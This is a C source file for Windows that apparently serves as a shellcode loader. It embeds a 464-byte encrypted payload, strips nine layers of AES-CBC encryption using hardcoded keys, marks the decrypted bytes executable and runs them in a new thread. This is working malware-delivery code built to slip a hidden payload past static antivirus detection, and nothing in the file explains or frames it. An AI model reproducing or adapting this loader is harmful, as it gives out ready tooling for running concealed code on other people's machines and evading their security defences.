#include <Windows.h>
#include "aes.h"
const BYTE pProtected[] = { 0xFC, 0x52, 0xA0, 0x16, 0x02, 0xF3, 0x55, 0x0D, 0x3F, 0x3D, 0x6C, 0xDC, 0x9E, 0x33, 0xFD, 0x8C, 0x7F, 0x3E, 0x84, 0xF3, 0xC2, 0x4E, 0x8E, 0x2C, 0xF7, 0xB9, 0x92, 0x0E, 0xB5, 0xF4, 0x1E, 0xA9, 0xC6, 0x80, 0x26, 0xD4, 0x30, 0xD8, 0x5C, 0xAE, 0x99, 0xD3, 0xF5, 0x19, 0x47, 0x87, 0xAD, 0x03, 0xDF, 0x05, 0x01, 0x8A, 0x66, 0xC9, 0xAA, 0xE3, 0x76, 0xBB, 0xAE, 0x1F, 0xFE, 0xA6, 0xD4, 0x48, 0x45, 0xAE, 0x78, 0xA3, 0x57, 0x54, 0x07, 0xC6, 0x58, 0xC6, 0x7D, 0x3C, 0x7C, 0x2D, 0xE9, 0xCC, 0x70, 0x4D, 0x19, 0x2F, 0x6B, 0x2F, 0xF5, 0x02, 0xC6, 0xCC, 0x51, 0x32, 0xFB, 0x1C, 0x82, 0x08, 0x85, 0xD2, 0xD1, 0xC3, 0x26, 0x04, 0x6E, 0x03, 0x7C, 0x15, 0xE5, 0x7B, 0xCB, 0xCE, 0xEE, 0x3A, 0x1C, 0x01, 0x39, 0xE3, 0x48, 0xF3, 0xFE, 0x00, 0x71, 0x12, 0xEC, 0x2E, 0xBB, 0xEB, 0xC7, 0x65, 0x8A, 0x39, 0xC7, 0x9E, 0x3D, 0x90, 0x85, 0x2F, 0xB8, 0x8A, 0x69, 0x62, 0xC8, 0x89, 0xF0, 0x6A, 0xCA, 0x93, 0x0E, 0x89, 0x8A, 0xD4, 0xC8, 0x98, 0x2E, 0x30, 0x73, 0x97, 0x80, 0x03, 0x91, 0xDB, 0xEB, 0x21, 0x8C, 0x15, 0xC8, 0x95, 0xB6, 0xBD, 0x31, 0xC5, 0x7E, 0x93, 0x23, 0xB4, 0x80, 0x7E, 0xDC, 0x2C, 0xB6, 0x14, 0x17, 0x34, 0x4B, 0x78, 0xDD, 0xC0, 0x70, 0xD3, 0x65, 0xA5, 0x1D, 0xA8, 0xA9, 0x8A, 0x97, 0x8D, 0x4A, 0x68, 0xAF, 0x4F, 0x9D, 0xBF, 0x29, 0x4E, 0x39, 0x4B, 0x33, 0x79, 0x08, 0x92, 0xB9, 0x9E, 0xA5, 0xE4, 0x04, 0x7D, 0x13, 0x42, 0x42, 0xFA, 0xB6, 0x65, 0x5C, 0xC2, 0xF3, 0x62, 0xD9, 0x35, 0xAC, 0x40, 0xC9, 0x07, 0xC4, 0xD4, 0xE2, 0xFC, 0xD6, 0x29, 0x10, 0x27, 0xB1, 0x11, 0xC0, 0xC2, 0x1E, 0xDB, 0x89, 0xAC, 0x7D, 0x4B, 0x59, 0x7B, 0x15, 0xD3, 0xD3, 0xA5, 0x81, 0x74, 0x61, 0xB5, 0x03, 0x90, 0x59, 0x8C, 0x78, 0x13, 0x1F, 0x85, 0x1A, 0x62, 0x9C, 0x4C, 0x54, 0x37, 0xFA, 0xDA, 0xE4, 0xDD, 0x1F, 0x22, 0x7B, 0x73, 0x0D, 0xBA, 0xEF, 0x8A, 0xD8, 0x5F, 0x74, 0x12, 0x76, 0xA8, 0xA6, 0x23, 0x96, 0x6D, 0x80, 0x78, 0xB7, 0x1F, 0x67, 0xAD, 0x86, 0xA0, 0x6E, 0x10, 0xEC, 0x23, 0x79, 0xAB, 0x89, 0x12, 0xAA, 0x8F, 0xC7, 0x8D, 0xB0, 0x29, 0x27, 0xDA, 0x26, 0x67, 0x9A, 0xD9, 0xCC, 0xD3, 0xDB, 0x47, 0x6A, 0xF0, 0xA7, 0xEB, 0xCF, 0x18, 0x9E, 0x75, 0xA8, 0xB5, 0x7B, 0x93, 0xD3, 0x7F, 0xAD, 0x0E, 0xE7, 0xC9, 0x86, 0x37, 0x46, 0x1A, 0x99, 0x48, 0x41, 0xA8, 0x49, 0x0D, 0x8A, 0x8D, 0xAA, 0x87, 0x6A, 0x91, 0x04, 0x30, 0x6F, 0x7A, 0x5B, 0x5D, 0x4D, 0x70, 0x97, 0x84, 0x56, 0x40, 0x3F, 0xCC, 0x36, 0xCB, 0x49, 0xB1, 0xE2, 0x77, 0xAF, 0x0C, 0x68, 0xB1, 0x44, 0x01, 0x93, 0x45, 0x73, 0x84, 0xA8, 0xAE, 0x82, 0x26, 0x51, 0x5A, 0xED, 0x8E, 0x63, 0x70, 0xF5, 0xCE, 0x6A, 0xE8, 0xD1, 0xC2, 0xDC, 0x24, 0xF9, 0xA0, 0x01, 0x73, 0x04, 0xA9, 0x30, 0xBD, 0x56, 0xF3, 0xE4, 0x96, 0xBE, 0xB0, 0xFC, 0xA2, 0xB1, 0xF4, 0x93, 0xC3, 0xCA, 0x70, 0xA0, 0x6E, 0xE9, 0x7B, 0xEE, 0xD9, 0x79, 0xE2, 0x7B, 0xAC, 0xBB, 0xDC, 0x70, 0xBA, 0x21, 0x10, 0x06, 0x78, 0x10, 0xC7, 0x31, 0xDD, 0x9E, 0x79, 0x68, 0x94, 0x13, 0xE9, 0xE3, 0x97, 0x05, 0xC5 };
SIZE_T sPayloadSize = 464;

int main(int argc, char* argv[]){

PVOID pPayload = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
RtlMoveMemory(pPayload, pProtected, sPayloadSize);

BYTE pKey0[] = { 0x2B, 0xCE, 0xDE, 0x31, 0x60, 0x4E, 0x40, 0xAA, 0x5A, 0x72, 0xE0, 0xE1, 0xAE, 0xC8, 0x2A, 0x65, 0x41, 0xF0, 0x48, 0x83, 0xBB, 0x46, 0x3B, 0x0C, 0x39, 0xC2, 0x2B, 0x59, 0x43, 0x1C, 0xFB, 0x8B };
BYTE pIV0[] = { 0x2B, 0xCE, 0xDE, 0x31, 0x60, 0x4E, 0x40, 0xAA, 0x5A, 0x72, 0xE0, 0xE1, 0xAE, 0xC8, 0x2A, 0x65 };

struct AES_ctx ctx0;
AES_init_ctx_iv(&ctx0, pKey0, pIV0);

BYTE pKey1[] = { 0xD9, 0x28, 0x52, 0x42, 0x18, 0xD6, 0x4D, 0x88, 0xE4, 0xD8, 0x52, 0x94, 0xAE, 0xEE, 0xF6, 0x39, 0x50, 0x9A, 0x80, 0x2E, 0xF0, 0x77, 0xF0, 0x07, 0x27, 0xCC, 0x41, 0x64, 0x62, 0x61, 0xEC, 0x69 };
BYTE pIV1[] = { 0xD9, 0x28, 0x52, 0x42, 0x18, 0xD6, 0x4D, 0x88, 0xE4, 0xD8, 0x52, 0x94, 0xAE, 0xEE, 0xF6, 0x39 };

struct AES_ctx ctx1;
AES_init_ctx_iv(&ctx1, pKey1, pIV1);

BYTE pKey2[] = { 0x70, 0x83, 0x4A, 0x22, 0x7F, 0x6B, 0x92, 0x89, 0xD1, 0x1D, 0xBE, 0x7E, 0xC2, 0x19, 0x9D, 0xA9, 0x2B, 0x62, 0x75, 0x45, 0x29, 0x32, 0xEB, 0x77, 0x20, 0xEC, 0x22, 0xDE, 0x00, 0x52, 0x27, 0x6B };
BYTE pIV2[] = { 0x70, 0x83, 0x4A, 0x22, 0x7F, 0x6B, 0x92, 0x89, 0xD1, 0x1D, 0xBE, 0x7E, 0xC2, 0x19, 0x9D, 0xA9 };

struct AES_ctx ctx2;
AES_init_ctx_iv(&ctx2, pKey2, pIV2);

BYTE pKey3[] = { 0x4D, 0xC3, 0xB3, 0x5F, 0x91, 0x44, 0x82, 0x39, 0x76, 0x87, 0x2A, 0x2E, 0x0A, 0xAA, 0x5F, 0xF7, 0xBA, 0xBD, 0x00, 0xC6, 0x7D, 0x26, 0xEB, 0xCC, 0x4F, 0x44, 0x16, 0xFE, 0xE1, 0x53, 0xDB, 0x19 };
BYTE pIV3[] = { 0x4D, 0xC3, 0xB3, 0x5F, 0x91, 0x44, 0x82, 0x39, 0x76, 0x87, 0x2A, 0x2E, 0x0A, 0xAA, 0x5F, 0xF7 };

struct AES_ctx ctx3;
AES_init_ctx_iv(&ctx3, pKey3, pIV3);

BYTE pKey4[] = { 0x8C, 0x97, 0x91, 0x88, 0x62, 0x47, 0x2F, 0xDE, 0x0E, 0x77, 0x40, 0x07, 0xB9, 0x41, 0xC5, 0x14, 0x04, 0x4D, 0x13, 0x12, 0x92, 0x47, 0x78, 0x26, 0xC8, 0x90, 0x21, 0xDD, 0xD0, 0x34, 0x3B, 0xBD };
BYTE pIV4[] = { 0x8C, 0x97, 0x91, 0x88, 0x62, 0x47, 0x2F, 0xDE, 0x0E, 0x77, 0x40, 0x07, 0xB9, 0x41, 0xC5, 0x14 };

struct AES_ctx ctx4;
AES_init_ctx_iv(&ctx4, pKey4, pIV4);

BYTE pKey5[] = { 0xFC, 0xE8, 0xE9, 0x05, 0x05, 0xFD, 0x5D, 0xD8, 0x40, 0x6E, 0xE6, 0xE4, 0x66, 0x5D, 0x34, 0xEB, 0xC1, 0x3F, 0xF6, 0xAE, 0x9C, 0x82, 0xF0, 0xB2, 0xF8, 0x73, 0x4E, 0x44, 0x80, 0x60, 0x38, 0xBB };
BYTE pIV5[] = { 0xFC, 0xE8, 0xE9, 0x05, 0x05, 0xFD, 0x5D, 0xD8, 0x40, 0x6E, 0xE6, 0xE4, 0x66, 0x5D, 0x34, 0xEB };

struct AES_ctx ctx5;
AES_init_ctx_iv(&ctx5, pKey5, pIV5);

BYTE pKey6[] = { 0xC8, 0x22, 0x67, 0x10, 0x5C, 0x91, 0xD6, 0xCD, 0x46, 0xAF, 0x25, 0x24, 0xB8, 0x38, 0x31, 0x4A, 0xA1, 0xAB, 0x8B, 0x63, 0x24, 0xF3, 0x83, 0x49, 0x48, 0x47, 0x85, 0x89, 0xF1, 0x4F, 0xA9, 0xAF };
BYTE pIV6[] = { 0xC8, 0x22, 0x67, 0x10, 0x5C, 0x91, 0xD6, 0xCD, 0x46, 0xAF, 0x25, 0x24, 0xB8, 0x38, 0x31, 0x4A };

struct AES_ctx ctx6;
AES_init_ctx_iv(&ctx6, pKey6, pIV6);

BYTE pKey7[] = { 0x38, 0xC0, 0x00, 0x2E, 0x8B, 0xA9, 0xE2, 0xED, 0x58, 0x62, 0x91, 0x91, 0x99, 0x51, 0xEA, 0x4E, 0x49, 0xD5, 0xE3, 0x16, 0x19, 0x2A, 0xD6, 0xA7, 0x65, 0x8D, 0x1D, 0xC7, 0x66, 0xA0, 0xDF, 0xCE };
BYTE pIV7[] = { 0x38, 0xC0, 0x00, 0x2E, 0x8B, 0xA9, 0xE2, 0xED, 0x58, 0x62, 0x91, 0x91, 0x99, 0x51, 0xEA, 0x4E };

struct AES_ctx ctx7;
AES_init_ctx_iv(&ctx7, pKey7, pIV7);

BYTE pKey8[] = { 0x04, 0xF9, 0x7C, 0x39, 0xE2, 0x3D, 0x5B, 0xE1, 0x5F, 0xA3, 0xCF, 0xD1, 0xEB, 0x2C, 0xE8, 0xAC, 0x2A, 0x42, 0x77, 0xCB, 0xA1, 0x9B, 0x69, 0x3D, 0xB6, 0x60, 0x54, 0x0C, 0xD7, 0x8F, 0x50, 0xC2 };
BYTE pIV8[] = { 0x04, 0xF9, 0x7C, 0x39, 0xE2, 0x3D, 0x5B, 0xE1, 0x5F, 0xA3, 0xCF, 0xD1, 0xEB, 0x2C, 0xE8, 0xAC };
struct AES_ctx ctx8;
AES_init_ctx_iv(&ctx8, pKey8, pIV8);

AES_CBC_decrypt_buffer(&ctx8, pPayload, sPayloadSize);
AES_CBC_decrypt_buffer(&ctx7, pPayload, sPayloadSize);
AES_CBC_decrypt_buffer(&ctx6, pPayload, sPayloadSize);
AES_CBC_decrypt_buffer(&ctx5, pPayload, sPayloadSize);
AES_CBC_decrypt_buffer(&ctx4, pPayload, sPayloadSize);
AES_CBC_decrypt_buffer(&ctx3, pPayload, sPayloadSize);
AES_CBC_decrypt_buffer(&ctx2, pPayload, sPayloadSize);
AES_CBC_decrypt_buffer(&ctx1, pPayload, sPayloadSize);
AES_CBC_decrypt_buffer(&ctx0, pPayload, sPayloadSize);

PVOID pWorkBuffer = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
RtlMoveMemory(pWorkBuffer, pPayload, sPayloadSize);

DWORD proc = 0;
BOOL bExecute = VirtualProtect(pWorkBuffer, sPayloadSize, PAGE_EXECUTE_READ, &proc);
HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)pWorkBuffer, 0, 0, 0);
WaitForSingleObject(hThread, -1);

return EXIT_SUCCESS;
}